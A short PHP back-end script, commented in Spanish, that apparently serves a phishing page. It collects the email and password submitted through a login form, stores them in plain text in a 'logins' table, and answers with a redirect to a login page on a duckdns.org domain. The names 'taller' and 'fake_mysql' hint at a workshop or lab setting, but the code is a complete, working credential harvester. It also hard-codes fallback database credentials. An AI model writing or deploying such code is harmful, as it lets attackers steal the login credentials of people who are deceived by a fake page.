<?php
// Establecer tipo de contenido JSON para AJAX
header('Content-Type: application/json');

// Tomar variables de entorno del contenedor
$dbHost = getenv('DB_HOST') ?: 'fake_mysql';
$dbName = getenv('DB_NAME') ?: 'taller';
$dbUser = getenv('DB_USER') ?: 'talleruser';
$dbPass = getenv('DB_PASS') ?: 'clave123';
$dbPort = getenv('DB_PORT') ?: 3306;

// Conexión con PDO
try {
    $pdo = new PDO(
        "mysql:host=$dbHost;dbname=$dbName;charset=utf8",
        $dbUser,
        $dbPass,
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
        ]
    );
} catch (PDOException $e) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Error de conexión a la base de datos: ' . $e->getMessage()
    ]);
    exit;
}

// Capturar datos del formulario
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

if (empty($email) || empty($password)) {
    echo json_encode(['status' => 'error', 'message' => 'Debes completar todos los campos']);
    exit;
}

// Guardar en la tabla logins
try {
    $stmt = $pdo->prepare("INSERT INTO logins (email, password) VALUES (:email, :password)");
    $stmt->execute([
        ':email' => $email,
        ':password' => $password
    ]);

    // Retornar éxito y URL de redirección
    echo json_encode([
        'status' => 'success',
        'redirect_url' => 'https://cooperar.duckdns.org/views/login.php'
    ]);
} catch (PDOException $e) {
    echo json_encode([
        'status' => 'error',
        'message' => 'No se pudo guardar el login: ' . $e->getMessage()
    ]);
}
